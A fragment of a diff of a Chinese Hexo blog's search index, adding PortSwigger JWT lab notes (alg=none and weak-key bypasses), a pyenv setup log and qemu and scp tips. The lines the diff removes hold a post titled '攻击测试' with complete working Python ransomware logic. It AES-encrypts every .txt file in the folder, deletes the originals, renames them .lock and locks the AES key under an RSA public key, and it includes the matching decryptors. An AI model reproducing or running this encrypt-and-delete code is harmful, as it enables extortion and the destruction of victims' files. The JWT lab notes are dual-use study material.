-<h1 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h1><p>本次测试使用aes密钥对目录下txt后缀文件进行加密，使用rsa公钥对aes密钥加密获得aes加密密钥，加密后缀为lock<br>模拟攻击者上传aes加密密钥。用户若想解密文件，则需要向攻击者取得rsa的私钥对aes加密密钥进行解密，然后通过aes密钥对加密文件解密</p>
-<h2 id="生成AES密钥"><a href="#生成AES密钥" class="headerlink" title="生成AES密钥"></a>生成AES密钥</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># aes_key.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_aes_key</span>():</span><br><span class="line">    <span class="comment"># 生成 128 位 AES 密钥（16 字节）</span></span><br><span class="line">    aes_key = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES 密钥: <span class="subst">&#123;aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存密钥到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;aes_key.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(aes_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES 密钥已保存到 aes_key.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_aes_key()</span><br></pre></td></tr></table></figure>
-
-<h2 id="aes加密文件"><a href="#aes加密文件" class="headerlink" title="aes加密文件"></a>aes加密文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">file_path, aes_key</span>):</span><br><span class="line">    <span class="comment"># 创建 AES 加密器</span></span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CBC)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file_data = file.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 填充数据并加密</span></span><br><span class="line">    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建加密后的文件路径，并修改后缀为 .lock</span></span><br><span class="line">    encrypted_file_path = file_path.rstrip(<span class="string">&#x27;.txt&#x27;</span>) + <span class="string">&#x27;.lock&#x27;</span>  <span class="comment"># 替换 .txt 后缀为 .lock</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存加密后的数据到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> encrypted_file:</span><br><span class="line">        encrypted_file.write(cipher.iv + encrypted_data)  <span class="comment"># 包括 IV 作为文件的前缀</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 删除原文件</span></span><br><span class="line">    os.remove(file_path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出加密成功信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;file_path&#125;</span> 已加密并保存为 <span class="subst">&#123;encrypted_file_path&#125;</span>，原文件已删除。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_txt_files</span>(<span class="params">aes_key</span>):</span><br><span class="line">    <span class="comment"># 遍历当前目录下的所有 .txt 文件并加密</span></span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> os.listdir():</span><br><span class="line">        <span class="keyword">if</span> file_name.endswith(<span class="string">&#x27;.txt&#x27;</span>):</span><br><span class="line">            encrypt_file(file_name, aes_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 读取保存的 AES 密钥（假设密钥是保存为 aes_key.bin）</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;aes_key.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        aes_key = f.read()</span><br><span class="line">    </span><br><span class="line">    encrypt_txt_files(aes_key)</span><br></pre></td></tr></table></figure>
-
-<h2 id="rsa公私钥生成"><a href="#rsa公私钥生成" class="headerlink" title="rsa公私钥生成"></a>rsa公私钥生成</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsa_keys.py</span></span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_rsa_keys</span>():</span><br><span class="line">    <span class="comment"># 生成 2048 位的 RSA 密钥对</span></span><br><span class="line">    public_key, private_key = rsa.newkeys(<span class="number">2048</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存公钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_public_key.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> pub_file:</span><br><span class="line">        pub_file.write(public_key.save_pkcs1())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存私钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_private_key.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> priv_file:</span><br><span class="line">        priv_file.write(private_key.save_pkcs1())</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RSA 公钥和私钥已生成并保存为 rsa_public_key.pem 和 rsa_private_key.pem&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_rsa_keys()</span><br></pre></td></tr></table></figure>
-
-<h2 id="rsa公钥加密aes"><a href="#rsa公钥加密aes" class="headerlink" title="rsa公钥加密aes"></a>rsa公钥加密aes</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsa_encrypt_aes_key.py</span></span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_aes_key_with_rsa</span>(<span class="params">aes_key</span>):</span><br><span class="line">    <span class="comment"># 读取 RSA 公钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_public_key.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> pub_file:</span><br><span class="line">        pub_key_data = pub_file.read()</span><br><span class="line">        public_key = rsa.PublicKey.load_pkcs1(pub_key_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 RSA 公钥加密 AES 密钥</span></span><br><span class="line">    encrypted_aes_key = rsa.encrypt(aes_key, public_key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存加密后的 AES 密钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;encrypted_aes_key.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> enc_file:</span><br><span class="line">        enc_file.write(encrypted_aes_key)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES 密钥已使用 RSA 公钥加密并保存为 encrypted_aes_key.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_original_aes_key</span>():</span><br><span class="line">    <span class="comment"># 删除原始 AES 密钥文件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.remove(<span class="string">&quot;aes_key.bin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原始 AES 密钥文件 aes_key.bin 已删除&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原始 AES 密钥文件 aes_key.bin 未找到&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 读取 AES 密钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;aes_key.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        aes_key = f.read()</span><br><span class="line">    </span><br><span class="line">    encrypt_aes_key_with_rsa(aes_key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 删除原始 AES 密钥文件</span></span><br><span class="line">    delete_original_aes_key()</span><br></pre></td></tr></table></figure>
-
-<h2 id="rsa公钥解密aes"><a href="#rsa公钥解密aes" class="headerlink" title="rsa公钥解密aes"></a>rsa公钥解密aes</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_aes_key_with_rsa</span>():</span><br><span class="line">    <span class="comment"># 读取 RSA 私钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_private_key.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> priv_file:</span><br><span class="line">        priv_key_data = priv_file.read()</span><br><span class="line">        private_key = rsa.PrivateKey.load_pkcs1(priv_key_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取加密的 AES 密钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;encrypted_aes_key.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> enc_file:</span><br><span class="line">        encrypted_aes_key = enc_file.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 RSA 私钥解密 AES 密钥</span></span><br><span class="line">    decrypted_aes_key = rsa.decrypt(encrypted_aes_key, private_key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 打印解密后的 AES 密钥</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密后的 AES 密钥: <span class="subst">&#123;decrypted_aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将解密后的 AES 密钥保存到 decrypt_aes_key.bin 文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt_aes_key.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> aes_key_file:</span><br><span class="line">        aes_key_file.write(decrypted_aes_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的 AES 密钥已保存为 decrypt_aes_key.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt_aes_key_with_rsa()</span><br></pre></td></tr></table></figure>
-
-<h2 id="de-aes解密file"><a href="#de-aes解密file" class="headerlink" title="de_aes解密file"></a>de_aes解密file</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file_with_aes</span>(<span class="params">file_path, aes_key</span>):</span><br><span class="line">    <span class="comment"># 读取加密文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> enc_file:</span><br><span class="line">        iv = enc_file.read(<span class="number">16</span>)  <span class="comment"># 获取文件前 16 字节作为 IV</span></span><br><span class="line">        encrypted_data = enc_file.read()  <span class="comment"># 获取剩余部分为加密数据</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建 AES 解密器</span></span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CBC, iv)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解密并去掉填充</span></span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取原文件名并移除 .lock 后缀</span></span><br><span class="line">    decrypted_file_path = file_path.rstrip(<span class="string">&#x27;.lock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 直接覆盖原文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(decrypted_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> dec_file:</span><br><span class="line">        dec_file.write(decrypted_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 删除原加密的 .lock 文件</span></span><br><span class="line">    os.remove(file_path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出解密成功信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;file_path&#125;</span> 已解密为 <span class="subst">&#123;decrypted_file_path&#125;</span> 并删除原文件&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_txt_files</span>(<span class="params">aes_key</span>):</span><br><span class="line">    <span class="comment"># 遍历当前目录下的所有 .lock 文件并解密</span></span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> os.listdir():</span><br><span class="line">        <span class="keyword">if</span> file_name.endswith(<span class="string">&#x27;.lock&#x27;</span>):</span><br><span class="line">            decrypt_file_with_aes(file_name, aes_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 读取解密的 AES 密钥（从 decrypt_aes_key.bin）</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt_aes_key.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        aes_key = f.read()</span><br><span class="line">    </span><br><span class="line">    decrypt_txt_files(aes_key)</span><br></pre></td></tr></table></figure>]]></content>
+    <title>Portswigger-JWT-LAB-2</title>
+    <url>/posts/a7e55bdc.html</url>
+    <content><![CDATA[<h1 id="通过有缺陷的签名验证绕过JWT身份验证"><a href="#通过有缺陷的签名验证绕过JWT身份验证" class="headerlink" title="通过有缺陷的签名验证绕过JWT身份验证"></a>通过有缺陷的签名验证绕过JWT身份验证</h1><p>服务器被不安全地配置为接受未签名的JWT，即通过修改alg为none并删除签名即可绕过</p>
+<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
+<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>思路还是一样，使用jwt令牌修改为admin进入admin界面，但需要对alg值修改为none，并删除签名部分<br><img src="/img/jwt/jwt2/jwt.png"><br>删除用户同理</p>
+]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>恶意软件</tag>
+        <tag>JWT Vulnerabilitiy</tag>
       </tags>
   </entry>
   <entry>
@@ -571,6 +439,54 @@
       </tags>
   </entry>
   <entry>
+    <title>Portswigger-JWT-LAB-3</title>
+    <url>/posts/d0e26b4a.html</url>
+    <content><![CDATA[<h1 id="通过弱签名密钥绕过JWT身份验证"><a href="#通过弱签名密钥绕过JWT身份验证" class="headerlink" title="通过弱签名密钥绕过JWT身份验证"></a>通过弱签名密钥绕过JWT身份验证</h1><p>当jwt令牌使用了一个弱的密钥进行签名和验证令牌，可以通过对密钥暴力破解获取加密密钥并对修改过的header和payload进行签名</p>
+<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
+<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>JWT Vulnerabilitiy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pyenv 简单使用记录</title>
+    <url>/posts/199c3661.html</url>
+    <content><![CDATA[<h1 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pyenv项目（我是下载pyenv然后解压到root下，plugin插件没有virtualenv-init，后面用git下载）</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ~]$ git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br></pre></td></tr></table></figure>
+<h1 id="bashrc环境配置"><a href="#bashrc环境配置" class="headerlink" title=".bashrc环境配置"></a>.bashrc环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;export PATH=&quot;$HOME/.pyenv/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init --path)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv virtualenv-init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
+<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p>更新出错显示没有virtualenv-init</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# source /root/.bashrc</span><br><span class="line">pyenv: no such command `virtualenv-init&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个命令可以将下载的插件直接放入pyenv的plugin插件文件夹下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# git clone https://github.com/pyenv/pyenv-virtualenv.git $(pyenv root)/plugins/pyenv-virtualenv</span><br><span class="line">Cloning into &#x27;/root/.pyenv/plugins/pyenv-virtualenv&#x27;...</span><br><span class="line">remote: Enumerating objects: 2301, done.</span><br><span class="line">再次更新成功</span><br></pre></td></tr></table></figure>
+<h1 id="本地缓存加快python包解压缩"><a href="#本地缓存加快python包解压缩" class="headerlink" title="本地缓存加快python包解压缩"></a>本地缓存加快python包解压缩</h1><p>创建cache文件夹缓存下载好的python压缩包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[python@iZuf6fkxk1equ6kjtxh1u3Z .pyenv]$ mkdir cache</span><br></pre></td></tr></table></figure>
+<p>直接使用pyenv下载环境速度很慢，推荐本地主机提前下载好python版本后scp上传服务器<br>（之前没用密钥认证可以使用kali，后续使用密钥认证后使用xshell的本地终端上传，但每次需要认证ssh密钥，有点麻烦）</p>
+<h1 id="scp文件上传"><a href="#scp文件上传" class="headerlink" title="scp文件上传"></a>scp文件上传</h1><p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>
+<h1 id="查看配置"><a href="#查看配置" class="headerlink" title="查看配置"></a>查看配置</h1><p>确认pyenv和virtualenv-init是否配置完成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which virtualenv-init</span><br><span class="line">/usr/bin/which: no virtualenv-init in (/root/.pyenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"></span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which pyenv</span><br><span class="line">pyenv ()</span><br><span class="line">&#123; </span><br><span class="line">    local command;</span><br><span class="line">    command=&quot;$&#123;1:-&#125;&quot;;</span><br><span class="line">    if [ &quot;$#&quot; -gt 0 ]; then</span><br><span class="line">        shift;</span><br><span class="line">    fi;</span><br><span class="line">    case &quot;$command&quot; in </span><br><span class="line">        activate | deactivate | rehash | shell)</span><br><span class="line">            eval &quot;$(pyenv &quot;sh-$command&quot; &quot;$@&quot;)&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *)</span><br><span class="line">            command pyenv &quot;$command&quot; &quot;$@&quot;</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="安装编译环境和依赖工具"><a href="#安装编译环境和依赖工具" class="headerlink" title="安装编译环境和依赖工具"></a>安装编译环境和依赖工具</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# sudo yum -y groupinstall &quot;Development Tools&quot;</span><br><span class="line">/usr/lib/python3.6/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.</span><br><span class="line">  from cryptography import x509</span><br><span class="line"></span><br><span class="line">Failed loading plugin &quot;spacewalk&quot;: module &#x27;lib&#x27; has no attribute &#x27;X509_V_FLAG_CB_ISSUER_CHECK&#x27;</span><br><span class="line">Last metadata expiration check: 2:54:19 ago on Wed 10 Jul 2024 05:25:19 PM CST.</span><br><span class="line">Dependencies resolved.</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装python环境"><a href="#安装python环境" class="headerlink" title="安装python环境"></a>安装python环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv install 3.10.0</span><br><span class="line">WARNING: Please make sure you remove any previous custom paths from your /root/.pydistutils.cfg file.</span><br><span class="line">Installing Python-3.10.0...</span><br><span class="line">patching file aclocal.m4</span><br><span class="line">patching file configure</span><br><span class="line">Hunk #5 succeeded at 10537 (offset -15 lines).</span><br><span class="line">patching file Misc/NEWS.d/next/Build/2021-10-11-16-27-38.bpo-45405.iSfdW5.rst</span><br><span class="line">patching file configure</span><br><span class="line">patching file configure.ac</span><br><span class="line">Installed Python-3.10.0 to /root/.pyenv/versions/3.10.0</span><br></pre></td></tr></table></figure>
+<h1 id="设置为全局"><a href="#设置为全局" class="headerlink" title="设置为全局"></a>设置为全局</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv global 3.10.0</span><br></pre></td></tr></table></figure>
+<h1 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# python -V</span><br><span class="line">Python 3.10.0</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>pyenv</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>npm更新报错</title>
     <url>/posts/63beea23.html</url>
     <content><![CDATA[<h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p>1.更新npm可能node版本不一致，导致命令无法使用<br>2.在 <a href="https://nodejs.org/zh-cn/download/releases/">https://nodejs.org/zh-cn/download/releases/</a> 内可查看node对应的npm版本<br>3.npm -g install npm @npm 安装指定npm版本号<br>4.若出现报错说明npm存在旧的npm缓存，或旧的npm环境，需将之前C盘Roaming下的npm，npm-cache两个文件删除<br>5.删除之后重新执行npm -g install npm @npm版本号<br>6.再次查看npm版本确认是否更换完成</p>
@@ -585,7 +501,7 @@
       </tags>
   </entry>
   <entry>
-    <title>rawtoiso</title>
+    <title>QEMU镜像格式转换工具</title>
     <url>/posts/41bf34a5.html</url>
     <content><![CDATA[<h1 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h1><p>qemu-img工具支持RAW、QCOW2、QCOW1、VMDK、VDI、VHD、VHDX或QED格式的镜像相互转换。<br>qemu-img工具不支持直接将ISO镜像转换为RAW、VHD和QCOW2格式。<br>将VHD格式转换为其他格式或者将其他文件格式转换为VHD格式时，需使用vpc参数代替VHD格式，否则可能造成qemu-img工具无法识别VHD镜像格式导致转换失败</p>
 <h1 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h1><h1 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h1><p><a href="https://qemu.weilnetz.de/w64/">https://qemu.weilnetz.de/w64/</a><br>qemu-w64-setup-20240903.exe </p>
@@ -594,6 +510,12 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img --help</span><br></pre></td></tr></table></figure>
 <div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">QCOW2转换为RAW格式</button><button type="button" class="tab">VHD转换为RAW格式</button><button type="button" class="tab">RAW转换为VMDK格式</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f qcow2 -O raw centos.qcow2 centos.raw</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f vpc -O raw centos.vhd centos.raw</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f raw -O vmdk centos.raw centos.vmdk</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
 ]]></content>
+      <categories>
+        <category>格式转换工具</category>
+      </categories>
+      <tags>
+        <tag>镜像转换</tag>
+      </tags>
   </entry>
   <entry>
     <title>repkg简单使用</title>
@@ -725,49 +647,15 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs靶场练习</title>
-    <url>/posts/d642dfa0.html</url>
-    <content><![CDATA[<p>虽然之前通关过一次但已历史久远，未来如果有机会再来一次的话我一定截图</p>
-]]></content>
+    <title>scp简单使用举例</title>
+    <url>/posts/b7234643.html</url>
+    <content><![CDATA[<p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>Web安全</category>
+        <category>命令行工具</category>
       </categories>
       <tags>
-        <tag>sql-inject</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pyenv 简单使用记录</title>
-    <url>/posts/199c3661.html</url>
-    <content><![CDATA[<h1 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pyenv项目（我是下载pyenv然后解压到root下，plugin插件没有virtualenv-init，后面用git下载）</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ~]$ git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br></pre></td></tr></table></figure>
